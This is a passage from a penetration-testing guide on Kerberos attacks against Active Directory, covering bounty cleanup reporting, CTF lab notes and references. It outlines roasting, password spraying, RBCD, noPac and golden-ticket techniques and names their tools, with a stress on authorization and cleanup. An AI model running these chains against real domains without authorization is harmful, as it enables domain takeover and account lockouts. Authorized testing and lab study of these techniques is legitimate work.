- **Cleanup is evidence too:** if you created a machine account (RBCD, noPac) or wrote an SPN/RBCD attribute (targeted roast, RBCD), record the `-delete`/`-action flush` output in the report so the triager can confirm you left no persistence. Clean up test artifacts; a forged golden ticket's lifetime and a stray `ATTACKER01$` account are exactly what a defender will hunt for after reading your report.

### C8. CTF notes

Kerberos is a staple of AD CTFs (HTB, CRTP/CRTE labs, PG Practice) and the same commands apply — but the economics differ from a bounty program in ways worth stating:

- **Clocks:** CTF boxes drift. Phase 0's `ntpdate`/`faketime` is not optional — `KRB5KRB_AP_ERR_SKEW` is the single most common "my valid attack won't fire" moment in a lab. On Linux attack boxes, `faketime "$(ntpdate -q DC | ...)" impacket-getTGT ...` or just `rdate`/`ntpdate` against the DC first.
- **Lockouts don't matter (mostly):** CTF realms usually disable lockout, so you can spray and brute hard — the C3 discipline is a *bounty* constraint, not a lab one. Internalise the discipline anyway; carrying "spray at will" habits into a real engagement locks out a production domain.
- **AS-REP/Kerberoast are almost always the intended first step** from a no-cred or one-cred foothold — a CTF author who sets `DONT_REQ_PREAUTH` or plants a weak-password service account is signposting the path. `rockyou.txt` cracks them by design; a real service account often won't.
- **RBCD / constrained delegation / noPac are classic "box" escalations** — in a lab you fire the full chain (create account, write RBCD, S4U) freely; in a bounty you usually report the writable ACL instead of exercising it. Same primitive, opposite disposition. The chain in C4 is the lab playbook; the authorization note is the bounty translation.
- **`setspn -Q */*`, `GetUserSPNs`, and BloodHound** are the standard recon trio; BloodHound's "Kerberoastable users" and "unconstrained delegation" queries map directly onto Phases 3 and 6.

### References (2026-11-19 supplement)

- SpecterOps Ghostpack — Rubeus kerberoast — https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast.md
- SpecterOps Ghostpack — Rubeus asreproast — https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/asreproast.md
- SpecterOps Ghostpack — Rubeus describe — https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/management/describe.md
- Impacket examples — describeTicket.py — https://sources.debian.org/src/impacket/0.13.0-1/examples/describeTicket.py
- Impacket examples — getPac.py / ticketer.py — https://sources.debian.org/src/impacket/0.13.0-2/examples/getPac.py
- ropnop kerbrute (passwordspray/userenum, --safe/--delay) — https://pkg.go.dev/github.com/ropnop/kerbrute
- Microsoft Learn — KDC_ERR_PREAUTH_REQUIRED vs KDC_ERR_PREAUTH_FAILED — https://learn.microsoft.com/hu-hu/archive/blogs/makeiteasy/kdc_err_preauth_required-vs-kdc_err_preauth_failed
- Microsoft TechNet — Appendix C: Kerberos and LDAP Error Messages — https://learn.microsoft.com/en-us/previous-versions/tn-archive/bb463166(v=technet.10)
- NetSPI — CVE-2020-17049 Bronze Bit (overview/theory/exploitation) — https://www.netspi.com/blog/technical-blog/network-pentesting/cve-2020-17049-kerberos-bronze-bit-overview/
- AD Security — Bronze Bit scenarios / PerformTicketSignature enforcement — https://adsecurity.org/?p=4926
- Horizon3 — From CVE-2022-33679 to unauthenticated Kerberoasting — https://www.horizon3.ai/from-cve-2022-33679-to-unauthenticated-kerberoasting/
- Silverfort — CVE-2022-33679 / CVE-2022-33647 technical analysis — https://www.silverfort.com/blog/technical-analysis-of-cve-2022-33679-and-cve-2022-33647-kerberos-vulnerabilities/
- Sophos — noPac (CVE-2021-42278 / CVE-2021-42287) — https://www.sophos.com/en-us/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware
- Dec0ne — KrbRelayUp (LDAP→RBCD→SYSTEM LPE) — https://github.com/Dec0ne/KrbRelayUp
- Synacktiv — Exploring cross-domain & cross-forest RBCD (Impacket getST realm note) — https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd
- InternalAllTheThings — Kerberos relay (KrbRelay, ESC8) — https://swisskyrepo.github.io/InternalAllTheThings/active-directory/internal-relay-kerberos/

*Supplement added 2026-11-19. Sources: SpecterOps Ghostpack (Rubeus) docs, Impacket example sources (0.13.0), ropnop kerbrute, Microsoft Learn/TechNet Kerberos error references, and vendor advisories (NetSPI, Horizon3, Silverfort, Sophos, Synacktiv) plus NVD/MSRC for CVE-2020-17049, CVE-2021-42278/42287 and CVE-2022-33679 — all consulted and cross-checked 2026-11-19. Lab-safe placeholders (example.com / 198.51.100.0/24) throughout; authorization-burden notes per attack class. Drafted by claude-opus-4-8.*
